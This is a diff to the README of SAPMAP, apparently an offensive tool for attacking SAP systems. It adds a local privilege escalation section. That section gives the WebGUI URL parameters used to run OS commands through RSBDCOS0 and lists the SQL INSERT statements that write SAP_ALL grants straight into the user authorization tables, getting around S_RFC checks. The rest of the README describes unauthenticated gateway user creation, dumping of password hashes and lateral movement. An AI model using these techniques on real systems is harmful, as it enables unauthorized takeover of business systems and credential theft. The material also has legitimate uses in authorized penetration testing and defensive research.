@@ -25,6 +25,7 @@ SAPMAP discovers SAP systems on a network, maps RFC connections between them, ex
 - [Web GUI](#web-gui)
 - [Scanning](#scanning)
 - [Exploitation](#exploitation)
+- [Local Privilege Escalation](#local-privilege-escalation)
 - [Propagation](#propagation)
 - [Standalone Tools](#standalone-tools)
 - [State Management](#state-management)
@@ -48,6 +49,11 @@ SAPMAP discovers SAP systems on a network, maps RFC connections between them, ex
 - **BAPI user creation** — Authenticated user creation with SAP_ALL via BAPI_USER_CREATE1
 - **SXPG remote execution** — Create users on remote systems via TCP/IP RFC destinations and SXPG_STEP_XPG_START
 - **Post-creation verification** — Confirm user exists and has SAP_ALL via RFC logon + BAPI_USER_GET_DETAIL
+
+### Local Privilege Escalation
+- **Extensible LPE framework** — Plugin-style `@lpe_method` decorator: add new methods by writing one function
+- **BAPI profile assignment** — Direct RFC call to assign SAP_ALL via BAPI_USER_PROFILES_ASSIGN (requires S_RFC)
+- **WebGUI RSBDCOS0 exploit** — Reverse-engineered WebGUI HTTP protocol to execute OS commands via RSBDCOS0, running SQL INSERTs to assign SAP_ALL directly in the database — bypasses S_RFC authorization entirely
 
 ### Lateral Movement
 - **RFC connection mapping** — Retrieve all Type 3 and TCP/IP RFC destinations from compromised systems
@@ -83,6 +89,7 @@ sapmap.py                    Entry point — CLI args, server launch, state mana
 │
 ├── sapmap_scanner.py        Network discovery — fast/deep scan, SAPControl, RFC probing
 ├── sapmap_exploit.py        Exploitation engine — GW exploit, BAPI, SXPG, propagation
+├── sapmap_lpe.py            Local privilege escalation — extensible method registry (WebGUI, BAPI)
 ├── sapmap_rfc.py            Authenticated RFC operations — BAPI calls, table reads, destination testing
 │
 ├── sapmap_models.py         Data models — SAPNode, RFCConnection, CreatedUser, SAPMAPState
@@ -200,6 +207,7 @@ The web interface is a single-page application with an interactive SVG map.
 | Check Gateway | Test SAPXPG vulnerability |
 | Create User (GW Exploit) | Unauthenticated user creation via gateway |
 | Create User (BAPI) | Authenticated user creation |
+| Try Local Privilege Escalation | Assign SAP_ALL to current user (tries BAPI, then WebGUI SQL) |
 | Propagate | Exploit RFC links to reach other systems |
 | Download Hashes | Extract USR02 password hashes |
 | Download Table | Read arbitrary SAP table data |
@@ -297,6 +305,66 @@ When credentials are available, SAPMAP creates users via standard BAPI function 
 ### RFC Destination Testing
 
 SAPMAP tests RFC destinations using `/SDF/RFC_CHECK` with automatic fallback to `DEST_CHECK_CONNECTION` on older systems (NW < 7.40) where `/SDF/RFC_CHECK` doesn't exist. The fallback also provides remote system SID, client, and basis release.
+
+---
+
+## Local Privilege Escalation
+
+When you have SAP credentials that lack SAP_ALL, SAPMAP can attempt to escalate the user's privileges directly on the system. Right-click a system on the map and choose **"Try Local Privilege Escalation"**.
+
+### How It Works
+
+SAPMAP tries registered LPE methods in priority order until one succeeds:
+
+| Priority | Method | Mechanism | Requirements |
+|----------|--------|-----------|--------------|
+| 10 | `bapi_profiles_assign` | Direct RFC call to `BAPI_USER_PROFILES_ASSIGN` | S_RFC authorization for the BAPI function group |
+| 50 | `webgui_rsbdcos0` | Execute SQL via OS commands through WebGUI | WebGUI HTTP access + S_TCODE for SE38 + authorization for RSBDCOS0 |
+
+### WebGUI RSBDCOS0 Method (Detail)
+
+This method reverse-engineers the SAP WebGUI HTTP protocol to execute OS commands without S_RFC authorization. The WebGUI runs transactions in dialog mode on the application server, so only S_TCODE and object-level authorizations apply — **not S_RFC**.
+
+**Protocol flow:**
+
+1. Open `SE38` with program `RSBDCOS0` via URL parameter: `~transaction=*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt`
+2. Load the selection screen via initial POST roundtrip with XSRF token (`~SEC_SESSTOKEN`)
+3. Execute OS commands via `state/ur` URL pattern with field values in the path
+
+**SQL statements executed** (example for HANA, user `basis_user`, client `000`):
+
+```sql
+-- Assign SAP_ALL and SAP_NEW profiles
+INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_ALL')
+INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_NEW')
+INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) VALUES ('000','basis_user','14','C SAP_ALL')
+
+-- Authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_ADMI_FCD','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DATASET','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DEVELOP','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_RFC','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TABU_DIS','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TCODE','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_AUT','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_GRP','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_PRO','^&_SAP_ALL')
+INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_XMI_PROD','^&_SAP_ALL')
+```
+
+Each SQL statement is wrapped in the appropriate DB CLI command (hdbsql for HANA, sqlcli for MaxDB, sqlcmd for MSSQL, sqlplus for Oracle, db2 for DB2) and executed as an OS command via RSBDCOS0.
+
+### Adding New LPE Methods
+
+New methods can be added by defining a decorated function in `sapmap_lpe.py` — no GUI, API, or framework changes needed:
+
+```python
+@lpe_method("my_new_method", "Description shown in console output", priority=75)
+def lpe_my_new_method(node: SAPNode, creds: Credentials) -> bool:
+    # Your escalation logic here
+    # Return True if SAP_ALL was successfully assigned
+    return True
+```
 
 ---
 
